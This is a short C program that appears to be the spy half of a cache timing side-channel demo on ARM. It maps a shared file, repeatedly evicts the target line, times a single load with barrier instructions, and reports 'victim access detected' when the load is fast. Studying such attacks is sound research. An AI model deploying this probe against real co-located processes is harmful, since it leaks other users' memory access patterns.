#include <stdint.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sched.h>
#include "common.h"

int main(void) {
	const char* file_path = "shared_target.bin";
	int fd = open(file_path, O_RDONLY);
	
	unsigned char* addr = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd, 0);

	uint64_t start, end, t_hit, t_miss;

	uint64_t threshold = 4;
	uint64_t diff = 0;
	uint8_t volatile dummy;
	while(1) {
		printf("before evict\n");
		evict_target();
		printf("evict finished\n");
		int i = 0;
		while(i < 4096) {
			i++;
			continue;
		}
		asm volatile("isb");
		asm volatile ("dsb sy");
		start = rdtsc();
		asm volatile ("isb; dsb sy");
		dummy = addr[0];
		asm volatile ("isb; dsb sy");
		end = rdtsc();
		diff = end - start;
		
		if (diff < threshold) {
			printf("victim access detected. time: %li\n", diff);
		}
	}
	munmap(addr, 4096);
	close(fd);
	return 0;
}

